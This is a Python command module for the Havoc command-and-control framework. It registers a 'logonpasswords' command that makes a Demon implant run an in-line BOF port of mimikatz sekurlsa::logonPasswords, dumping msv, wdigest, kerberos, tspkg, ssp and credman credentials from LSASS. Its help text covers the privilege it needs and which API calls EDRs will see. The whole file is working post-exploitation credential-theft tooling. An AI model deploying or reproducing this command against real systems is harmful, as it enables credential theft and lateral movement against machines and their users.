from havoc import Demon, RegisterCommand


LOGONPASSWORDS_HELP = """logonpasswords
    Dumps credentials (msv/wdigest/kerberos/tspkg/ssp/credman) from LSASS by
    running the mimikatz sekurlsa::logonPasswords port in-line as a BOF.

Arguments:
    (none)

Notes:
    - Requires SYSTEM or an elevated token with SeDebugPrivilege. The BOF
      enables SeDebugPrivilege for the current thread on entry.
    - Uses OpenProcess + ReadProcessMemory against LSASS ("easy route");
      EDRs that hook these calls will see it.
"""


def logonpasswords(demonID, *params):
    demon = Demon(demonID)

    if len(params) > 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "logonpasswords takes no arguments")
        return

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to run sekurlsa::logonPasswords")
    demon.InlineExecute(TaskID, "go", f"bin/logonpasswords.{demon.ProcessArch}.o", b"", False)
    return TaskID


RegisterCommand(logonpasswords, "", "logonpasswords",
    "Dump LSASS credentials via mimikatz sekurlsa::logonPasswords (BOF)", 0,
    LOGONPASSWORDS_HELP, "logonpasswords")
